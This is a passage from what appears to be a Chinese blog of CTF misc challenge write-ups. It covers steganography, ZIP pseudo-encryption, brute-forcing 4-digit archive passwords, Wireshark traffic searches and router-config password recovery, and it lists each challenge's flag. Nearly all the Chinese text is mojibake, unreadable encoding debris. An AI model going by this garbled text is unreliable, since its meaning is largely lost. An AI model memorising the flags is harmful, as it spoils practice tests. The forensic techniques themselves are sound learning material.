æ­¤å·¦åŠéƒ¨åˆ†å°±ç†è§£äº†</p><p>å³åŠéƒ¨åˆ†å°±æ˜¯Extra By(é¢å¤–çš„)å’ŒBit Orderï¼ˆä½é¡ºåºï¼‰å’ŒBit Plane Orderï¼ˆä½å¹³é¢çš„é¡ºåºï¼‰</p><p>1ï¼‰.Extra By(é¢å¤–çš„)ï¼šåˆ†ä¸ºrowï¼ˆè¡Œï¼‰å’Œcolumnï¼ˆçºµï¼‰</p><p>  æ¯ä¸ªåƒç´ ç”¨Rï¼ŒGï¼ŒBä¸‰ä¸ªåˆ†é‡è¡¨ç¤ºï¼Œé‚£ä¹ˆä¸€å¼ å›¾ç‰‡å°±åƒä¸€ä¸ªçŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªå•ä½å°±æ˜¯ï¼ˆ0<del>255ï¼Œ0</del>255ï¼Œ0~255ï¼‰</p><p>  ä¹Ÿå°±ä¼šæœ‰æ˜¯çºµæ’åˆ—å’Œè¡Œæ’åˆ—äº†ï¼Œä¸€èˆ¬äº‹å…ˆè®¿é—®è¡Œå†è®¿é—®åˆ—ï¼ˆå¦‚æœç›¸åä¼šå¼•èµ·veä½¿ç”¨æ–¹æ³•ï¼‰</p><p>ï¿¼2ï¼‰.Bit Orderï¼ˆä½é¡ºåºï¼‰:MSBæ˜¯ä¸€ä¸²æ•°æ®çš„æœ€é«˜ä½ï¼ŒLSBæ˜¯ä¸€ä¸²æ•°æ®çš„æœ€ä½ä½ã€‚</p><p>3ï¼‰.Bit Plane Orderï¼ˆä½å¹³é¢çš„é¡ºåº)</p><p>   æ•´ä¸ªå›¾åƒåˆ†è§£ä¸º8ä¸ªä½å¹³é¢ï¼Œä»LSB(æœ€ä½æœ‰æ•ˆä½0)åˆ°MSBï¼ˆæœ€é«˜æœ‰æ•ˆä½7ï¼‰éšç€ä»ä½å¹³é¢0 åˆ°ä½å¹³é¢7ï¼Œä½å¹³é¢å›¾åƒçš„ç‰¹å¾é€æ¸å˜å¾—å¤æ‚ï¼Œç»†èŠ‚ä¸æ–­å¢åŠ ã€‚ï¼ˆä¸€èˆ¬æˆ‘ä»¬çš„å›¾ç‰‡å¦‚æœæ˜¯RGBé‚£ä¹ˆå°±æ˜¯24ä½ 3ä¹˜8å˜›ï¼‰</p><p>4ï¼‰Bit Plane Orderï¼ˆä½å¹³é¢çš„é¡ºåºï¼‰:ä¸€èˆ¬å›¾ç‰‡æ˜¯24ä½ ä¹Ÿå°±æ˜¯3ä¸ª8 å¤§å®¶å¯ä»¥æƒ³åƒæˆä¸‰æ˜æ²» æ¯”å¦‚BGRå°±æ˜¯Bä¸ºä¸‰æ˜æ²»ç¬¬ä¸€å±‚ Gä¸ºç¬¬äºŒå±‚ Rä¸ºç¬¬ä¸‰å±‚ã€‚</p><h3 id="å…³äºæ­¤é¢˜ï¼šLSB"><a href="#å…³äºæ­¤é¢˜ï¼šLSB" class="headerlink" title="å…³äºæ­¤é¢˜ï¼šLSB"></a>å…³äºæ­¤é¢˜ï¼šLSB</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51645_2.png" alt></p><p>save binæ ¼å¼ä¸ºpngåï¼Œä¼šå‘ç°è¿™æ˜¯ä¸€æ ·äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°cumtctf{1sb_i4_s0_Ea4y}</p><p>flag{1sb_i4_s0_Ea4y}</p><h2 id="æ–‡ä»¶ä¸­çš„ç§˜å¯†"><a href="#æ–‡ä»¶ä¸­çš„ç§˜å¯†" class="headerlink" title="æ–‡ä»¶ä¸­çš„ç§˜å¯†"></a>æ–‡ä»¶ä¸­çš„ç§˜å¯†</h2><p>å¾—åˆ°ä¸€ä¸ªjpegåç¼€çš„å›¾ç‰‡</p><p>åŸæ¥flagè—åœ¨æ–‡ä»¶çš„å±æ€§é‡Œé¢å•Š</p><h1 id="2021-1-17"><a href="#2021-1-17" class="headerlink" title="2021/1/17"></a>2021/1/17</h1><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>æç¤ºï¼šè¿™ä¸ªæ˜¯ä¸€ä¸ªraræ–‡ä»¶ï¼Œé‡Œé¢å¥½åƒéšè—ç€ä»€ä¹ˆç§˜å¯†ï¼Œä½†æ˜¯å‹ç¼©åŒ…è¢«åŠ å¯†äº†ï¼Œæ¯«æ— ä¿ç•™çš„å‘Šè¯‰ä½ ï¼Œrarçš„å¯†ç æ˜¯4ä½çº¯æ•°å­—ã€‚</p><p>çˆ†ç ´å°±ok</p><p>å¯†ç ï¼š8795</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>æç¤ºï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ)</p><p>ç›´æ¥æœç´¢passwordï¼Œæ‰¾åˆ°å¯¹åº”çš„valueå°±æ˜¯flag</p><p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>å¾—åˆ°ä¸€ä¸ªäºŒç»´ç </p><p>æ‰«ç å³å¯flag{878865ce73370a4ce607d21ca01b5e59}</p><h2 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h2><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><h3 id="æ¥äº†è§£ä¸€ä¸‹ZIPæ–‡ä»¶çš„ç»„æˆ"><a href="#æ¥äº†è§£ä¸€ä¸‹ZIPæ–‡ä»¶çš„ç»„æˆ" class="headerlink" title="æ¥äº†è§£ä¸€ä¸‹ZIPæ–‡ä»¶çš„ç»„æˆ"></a><strong>æ¥äº†è§£ä¸€ä¸‹ZIPæ–‡ä»¶çš„ç»„æˆ</strong></h3><p>ä¸€ä¸ª ZIP æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š<br>ã€€ã€€å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</p><h4 id="a-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"><a href="#a-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š" class="headerlink" title="a.å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"></a>a.å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</h4><p>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br><strong>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œå¥‡æ•°åŠ å¯†ï¼Œå¶æ•°æ— åŠ å¯†ï¼‰</strong><br>08 00ï¼šå‹ç¼©æ–¹å¼<br>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´<br>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰<br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰<br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰<br>07 00ï¼šæ–‡ä»¶åé•¿åº¦<br>00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500</p><h4 id="b-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº"><a href="#b-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº" class="headerlink" title="b.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº:"></a>b.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº:</h4><p>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50)<br>3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br><strong>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œå¥‡æ•°åŠ å¯†ï¼Œå¶æ•°æ— åŠ å¯†ï¼‰</strong><br>08 00ï¼šå‹ç¼©æ–¹å¼<br>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´<br>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰<br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰<br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰<br>07 00ï¼šæ–‡ä»¶åé•¿åº¦<br>24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦<br>00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦<br>00 00ï¼šç£ç›˜å¼€å§‹å·<br>00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§<br>20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§<br>00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p><h4 id="c-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—"><a href="#c-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—" class="headerlink" title="c.å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—:"></a>c.å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—:</h4><p>50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®°<br>00 00ï¼šå½“å‰ç£ç›˜ç¼–å·<br>00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·<br>01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°<br>01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•°<br>59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å°<br>3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡<br>00 00 1Aï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</p><p>åœ¨è¿™ä¸ª010å·¥å…·é‡Œé¢ä»–ä¼šè‡ªåŠ¨è¯†åˆ«å¹¶ä¸”ç»™ä½ ï¼Œè¿™é‡Œé’ˆå¯¹æˆ‘çš„åŠ ç²—å­—ä½“çš„åœ°æ–¹è¿›è¡Œä¿®æ”¹ï¼ŒåŸºæœ¬å°±æ˜¯ä½äº14 00åé¢ï¼Œä¿å­˜å†æ¬¡æ‰“å¼€å°±æ²¡åŠ å¯†äº†flag{Adm1N-B2G-kU-SZIP}</p><h1 id="2021-1-18"><a href="#2021-1-18" class="headerlink" title="2021/1/18"></a>2021/1/18</h1><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>foremostè·‘ä¸€ä¸‹å¾—åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8820%E6%97%A50026_1.png" alt></p><p>æ ¹æ®é¢˜ç›®æ‰€è¯´çš„4ä½æ•°ï¼Œæˆ‘ä»¬ç›´æ¥è¿›è¡Œçˆ†ç ´å¾—åˆ°å¯†ç 8368çš„æ‰“å¼€æ–‡ä»¶å¾—åˆ°flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><h2 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h2><p>å¾—åˆ°å›¾ç‰‡åå­—å«steg</p><p>æ‰€ä»¥ç”¨stegsolveæ‰“å¼€lsbéšå†™(åœ¨red plane 0å¤„ï¼Œå·¦ä¸Šè§’æœ‰æ— è§„åˆ™ç‚¹)ç»ˆç»“é¢˜ç›®</p><p>flag{st3g0_ saurus_wr3cks}</p><h2 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h2><p>tipï¼šæŸé»‘å®¢æ½œå…¥åˆ°æŸå…¬å¸å†…ç½‘é€šè¿‡å—…æ¢æŠ“å–äº†ä¸€æ®µæ–‡ä»¶ä¼ è¾“çš„æ•°æ®ï¼Œè¯¥æ•°æ®ä¹Ÿè¢«è¯¥å…¬å¸æˆªè·ï¼Œä½ èƒ½å¸®è¯¥å…¬å¸åˆ†æä»–æŠ“å–çš„åˆ°åº•æ˜¯ä»€ä¹ˆæ–‡ä»¶çš„æ•°æ®å—ï¼Ÿ</p><p>ç›´æ¥wiresharkæŸ¥æ‰¾flagï¼Œctrl+dæ‰¾åˆ°ä¸ä¹‹å¯¹åº”çš„åˆ†ç»„è¯¦æƒ…ï¼Œå³é”®æ˜¾ç¤ºåˆ†ç»„å­—èŠ‚å³å¯flag{da73d88936010da1eeeb36e945ec4b97}</p><h2 id="å°æ˜çš„ä¿é™©ç®±"><a href="#å°æ˜çš„ä¿é™©ç®±" class="headerlink" title="å°æ˜çš„ä¿é™©ç®±"></a>å°æ˜çš„ä¿é™©ç®±</h2><p>æç¤ºï¼šå°æ˜æœ‰ä¸€ä¸ªä¿é™©ç®±ï¼Œé‡Œé¢çè—äº†å°æ˜çš„æ—¥è®°æœ¬ï¼Œä»–è®°å½•äº†ä»€ä¹ˆç§˜å¯†å‘¢ï¼Ÿã€‚ã€‚ã€‚å‘Šè¯‰ä½ ï¼Œå…¶å®ä¿é™©ç®±çš„å¯†ç å››ä½çº¯æ•°å­—å¯†ç ã€‚</p><p>å¾—åˆ°çš„å›¾ç‰‡æ”¹ä¸º.zipåç¼€ï¼Œç›´æ¥çˆ†ç ´å³å¯7869</p><p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h1 id="2021-1-19"><a href="#2021-1-19" class="headerlink" title="2021/1/19"></a>2021/1/19</h1><h2 id="çˆ±å› æ–¯å¦"><a href="#çˆ±å› æ–¯å¦" class="headerlink" title="çˆ±å› æ–¯å¦"></a>çˆ±å› æ–¯å¦</h2><p>å¾—åˆ°æ–‡ä»¶jpg</p><p>winhexæ‰“å¼€å‘ç°äº†é‡Œé¢è¯´æœ‰flag.txt</p><p>é‚£ä¹ˆç”¨foremoståˆ†ç¦»è‚¯å®šä¼šå¾—åˆ°ä¸œè¥¿</p><pre><code>-V  - æ˜¾ç¤ºç‰ˆæƒä¿¡æ¯å¹¶é€€å‡º-t  - æŒ‡å®šæ–‡ä»¶ç±»å‹.  (-t jpeg,pdf ...) -d  -æ‰“å¼€é—´æ¥å—æ£€æµ‹ (é’ˆå¯¹UNIXæ–‡ä»¶ç³»ç»Ÿ) -i  - æŒ‡å®šè¾“å…¥æ–‡ä»¶ (é»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥) -a  - å†™å…¥æ‰€æœ‰çš„æ–‡ä»¶å¤´éƒ¨, ä¸æ‰§è¡Œé”™è¯¯æ£€æµ‹(æŸåæ–‡ä»¶) -w  - å‘ç£ç›˜å†™å…¥å®¡è®¡æ–‡ä»¶ï¼Œä¸å†™å…¥ä»»ä½•æ£€æµ‹åˆ°çš„æ–‡ä»¶-o  - è®¾ç½®è¾“å‡ºç›®å½• (é»˜è®¤ä¸ºä¸ºè¾“å‡º)-c  - è®¾ç½®é…ç½®æ–‡ä»¶ (é»˜è®¤ä¸º foremost.conf)-q  - å¯ç”¨å¿«é€Ÿæ¨¡å¼. åœ¨512å­—èŠ‚è¾¹ç•Œæ‰§è¡Œæœç´¢.-Q  - å¯ç”¨å®‰é™æ¨¡å¼. ç¦ç”¨è¾“å‡ºæ¶ˆæ¯. -v  - è¯¦ç»†æ¨¡å¼. å‘å±å¹•ä¸Šè®°å½•æ‰€æœ‰æ¶ˆæ¯ã€‚</code></pre><p>åˆ†ç¦»å¾—åˆ°zipæ–‡ä»¶ï¼Œæœ‰å¯†ç ï¼Œåœ¨æ–‡ä»¶å±æ€§é‡Œé¢å‘ç°this_is_not_passwordå…¶å®è¿™ä¸ªå°±æ˜¯å¯†ç ï¼Œmadè¿˜æ‘†æˆ‘ä¸€é“</p><p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>pcapæ–‡ä»¶ç”¨wiresharkæ‰“å¼€å‘ç°éƒ½æ˜¯tcpæ–‡ä»¶ï¼Œè€Œä¸”å¥½åƒæ˜¯ä»å¶æ•°å¼€å§‹ï¼Œæ¯ä¸ªåŒ…éƒ½å¸¦æœ‰dataçš„ä¸€ç‚¹ç‚¹å°æ•°æ®FLAG:385b87afc8671dee07550290d16a8071</p><p>flag{385b87afc8671dee07550290d16a8071}</p><h2 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h2><p>ç”¨winhexæ‰“å¼€åœ¨æœ€åå‘ç°äº†äºŒè¿›åˆ¶ç¼–ç 01101011011011110110010101101011011010100011001101110011</p><p>åˆ†å‰²ï¼š01101011 01101111 01100101 01101011 01101010 00110011 01110011</p><p>å¾—åˆ°koekj3så°±æ˜¯flag</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>æç¤ºï¼šè¯·å°† hctf æ›¿æ¢ä¸º flag æäº¤ï¼Œæ ¼å¼ flag{}</p><p>lsbéšå†™åˆ†ç¦»å¾—åˆ°æ–‡ä»¶ï¼Œæ”¹ä¸ºzipæ ¼å¼ï¼Œè§£å‹å¾—åˆ°æ— åç¼€æ–‡ä»¶1ï¼Œwinhexæ‰“å¼€å¾—åˆ°ï¼š</p><p>hctf{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><p>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><h1 id="2021-1-20"><a href="#2021-1-20" class="headerlink" title="2021/1/20"></a>2021/1/20</h1><h2 id="éšè—çš„é’¥åŒ™"><a href="#éšè—çš„é’¥åŒ™" class="headerlink" title="éšè—çš„é’¥åŒ™"></a>éšè—çš„é’¥åŒ™</h2><p>å¾—åˆ°ä¸€å¼ è·¯é£çš„å›¾ç‰‡</p><p>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</p><p>flag{377cbadda1eca2f2f73d36277781f00a}</p><h2 id="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"><a href="#å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜" class="headerlink" title="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"></a>å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜</h2><p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæˆ‘æ€€ç–‘ä¸Šé¢æ˜¯ç›²æ–‡è§£å¯†</p><p>å¾—åˆ°ï¼škmdonowg</p><p>è¿™ä¸ªä¸€å®šå°±æ˜¯musicå‹ç¼©åŒ…çš„å¯†ç ï¼Œç»“æœæ‰“å¼€ä»¥åä¸€å¬ï¼Œé‡Œé¢æ˜¯è«æ–¯ç”µç çš„æ€§è´¨ï¼Œç”¨åˆ°å·¥å…·audacityå¾—åˆ°ç”µç ï¼š</p><p>-.-. - ..-. .â€“ .â€“. . .. â€”â€“ â€”.. â€“â€¦ â€¦â€“ ..â€” ..â€“.. ..â€” â€¦â€“ -.. â€“..</p><p>è§£ç ï¼š</p><p>CTFWPEI08732?23DZ</p><p>flag{wpei08732?23dz}</p><h2 id="BJDCTF-2nd-æœ€ç®€å•çš„misc-y1ng"><a href="#BJDCTF-2nd-æœ€ç®€å•çš„misc-y1ng" class="headerlink" title="[BJDCTF 2nd]æœ€ç®€å•çš„misc-y1ng"></a>[BJDCTF 2nd]æœ€ç®€å•çš„misc-y1ng</h2><p>ç»§ç»­winhexæ‰“å¼€<br>å‘ç°å°‘äº†pngçš„æ–‡ä»¶å¤´ã€‚<br>äºæ˜¯æ·»åŠ ä¸Šå»ï¼ˆå¤åˆ¶ç²˜è´´ï¼šå¡’NG)â†89 50 4E 47</p><p>å¾—åˆ°å®Œæ•´å›¾ç‰‡ä¹Ÿå°±æ˜¯424A447B79316E677A756973687561697D</p><p>BJD{y1ngzuishuai}</p><h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p>å¾—åˆ°å›¾ç‰‡ä½¿ç”¨<code>010 editor</code>æ‰“å¼€çš„æ—¶å€™å‡ºç°<code>CRC</code>åŒ¹é…é”™è¯¯</p><p>æ€»ç»“ï¼šè¿™ç§é”™è¯¯æ„æ€å°±æ˜¯å›¾ç‰‡çš„é«˜åº¦è¢«ä¿®æ”¹è¿‡</p><p>æ”¹å‰ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_1.png" alt></p><p>æ”¹åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_2.png" alt></p><p>ç„¶åå°±ä¼šçœ‹åˆ°flag</p><p>BJD{PnG_He1ghT_1s_WR0ng}</p><p>flag{PnG_He1ghT_1s_WR0ng}</p><p>æ–‡ä»¶å¤´æ ¼å¼ï¼š</p><p>JPEG (jpg)ï¼Œ <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">æ–‡ä»¶</a>å¤´ï¼šFFD8FF</p><p>PNG (png)ï¼Œ <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">æ–‡ä»¶</a>å¤´ï¼š89504E47</p><p>GIF (gif)ï¼Œ <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">æ–‡ä»¶</a>å¤´ï¼š47494638</p><p>ZIP Archive (zip)ï¼Œ <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">æ–‡ä»¶</a>å¤´ï¼š504B0304</p><p>RAR Archive (rar)ï¼Œ <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">æ–‡ä»¶</a>å¤´ï¼š52617221</p><h1 id="2021-1-21"><a href="#2021-1-21" class="headerlink" title="2021/1/21"></a>2021/1/21</h1><h2 id="ç¥ç§˜é¾™å·é£"><a href="#ç¥ç§˜é¾™å·é£" class="headerlink" title="ç¥ç§˜é¾™å·é£"></a>ç¥ç§˜é¾™å·é£</h2><p>hintï¼šç¥ç§˜é¾™å·é£è½¬è½¬è½¬ï¼Œç§‘å­¦å®¶ç”¨å››ä½æ•°å­—ä¸ºå®ƒå‘½åï¼Œä½†æ˜¯å‘ç°è§£å¯†åå±…ç„¶æ˜¯ä¸€ä¸²å¤–æ˜Ÿäººä»£ç ï¼ï¼å¥½å¯æ€•ï¼</p><p>å››ä½æ•°å¯†ç ï¼š5463</p><p>å¾—åˆ°é¾™å·é£ï¼šbrainfuckè§£å¯†</p><p>å¾—flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h2 id="BJDCTF-2nd-å°å§å§-y1ng"><a href="#BJDCTF-2nd-å°å§å§-y1ng" class="headerlink" title="[BJDCTF 2nd]å°å§å§-y1ng"></a>[BJDCTF 2nd]å°å§å§-y1ng</h2><p>WINHEXæ‰“å¼€ï¼š</p><p>BJD{haokanma_xjj}</p><h2 id="åé—¨æŸ¥æ€"><a href="#åé—¨æŸ¥æ€" class="headerlink" title="åé—¨æŸ¥æ€"></a>åé—¨æŸ¥æ€</h2><p>hintï¼šå°ç™½çš„ç½‘ç«™è¢«å°é»‘æ”»å‡»äº†ï¼Œå¹¶ä¸”ä¸Šä¼ äº†Webshellï¼Œä½ èƒ½å¸®å°ç™½æ‰¾åˆ°è¿™ä¸ªåé—¨ä¹ˆï¼Ÿ(Webshellä¸­çš„å¯†ç (md5)å³ä¸ºç­”æ¡ˆ)ã€‚</p><p>å·¥å…·ï¼šDç›¾ä¸€æ‰«å°±å‡ºæ¥äº†</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h2 id="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"><a href="#è·å…°å®½å¸¦æ•°æ®æ³„éœ²" class="headerlink" title="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"></a>è·å…°å®½å¸¦æ•°æ®æ³„éœ²</h2><p>å¾—åˆ°æ–‡ä»¶ï¼šconf.bin</p><p>è¿™æ˜¯è·¯ç”±å™¨é…ç½®æ–‡ä»¶ã€‚RouterPassViewæ‰“å¼€ã€‚</p><p>  æ‰¾åˆ°ï¼šUsername val=053700357621 </p><p>flag{053700357621}</p><h1 id="2021-1-22"><a href="#2021-1-22" class="headerlink" title="2021/1/22"></a>2021/1/22</h1><h2 id="æ¥é¦–æ­Œå§"><a href="#æ¥é¦–æ­Œå§" class="headerlink" title="æ¥é¦–æ­Œå§"></a>æ¥é¦–æ­Œå§</h2><p>å¾—åˆ°æ–‡ä»¶ï¼šstego100.wav</p><p>audacityæ‰“å¼€ï¼Œç„¶åä½¿åŠ²æ”¾å¤§å¾—åˆ°ç”µç </p><p>flag{5BC925649CB0188F52E617D70929191C}</p><h2 id="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"><a href="#æ•°æ®åŒ…ä¸­çš„çº¿ç´¢" class="headerlink" title="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"></a>æ•°æ®åŒ…ä¸­çš„çº¿ç´¢</h2><p>hintï¼šå…¬å®‰æœºå…³è¿‘æœŸæˆªè·åˆ°æŸç½‘ç»œçŠ¯ç½ªå›¢ä¼™åœ¨çº¿äº¤æµçš„æ•°æ®åŒ…ï¼Œä½†æ— æ³•åˆ†æå‡ºå…·ä½“çš„äº¤æµå†…å®¹ï¼Œèªæ˜çš„ä½ èƒ½å¸®å…¬å®‰æœºå…³æ‰¾åˆ°çº¿ç´¢å—ï¼Ÿ </p><p>å¾—åˆ°æ–‡ä»¶ï¼šæµé‡ä¸­çš„çº¿ç´¢.pcapng</p><p>wiresharkæŠ“åŒ…HTTPåè®®çš„200å“åº”çš„å¾—åˆ°base64ç¼–ç </p><p><a href="https://the-x.cn/base64è§£ç ä¸‹è½½jpgæ ¼å¼å›¾ç‰‡" target="_blank" rel="noopener">https://the-x.cn/base64è§£ç ä¸‹è½½jpgæ ¼å¼å›¾ç‰‡</a></p><p>flag{209acebf6324a09671abc31c869de72c}</p><h2 id="ä¹è¿ç¯"><a href="#ä¹è¿ç¯" class="headerlink" title="ä¹è¿ç¯"></a>ä¹è¿ç¯</h2><p>å¾—åˆ°jpgå›¾ç‰‡ï¼Œé€šè¿‡winhexå‘ç°æœ‰zipéƒ¨åˆ†ï¼Œåç¼€æ”¹ä¸ºzipå‘ç°å®ä¼ªåŠ å¯†ï¼Œzipæ–‡ä»¶å¤´ä¸º50 4B 01 02ç”¨010æœç´¢ä¸€ä¸‹ï¼Œåœ¨14åé¢æ¥æ”¹ä¼ªåŠ å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œç”¨steghideè§£å†³é—®é¢˜ï¼š</p><pre><code>steghide info good.jpgsteghide extract -sf good.jpg</code></pre><p>å…³äºè¿™ä¸ªç”¨æ³•ï¼Œåœ¨windowsä¸Šçš„ç”¨æ³•ç®€å•ï¼Œè‡ªå·±å¯»æ€å§ï¼Œæœ€åå¾—åˆ°æ–‡ä»¶ï¼ško.txt</p><p>åˆ©ç”¨é‡Œé¢çš„å¯†ç 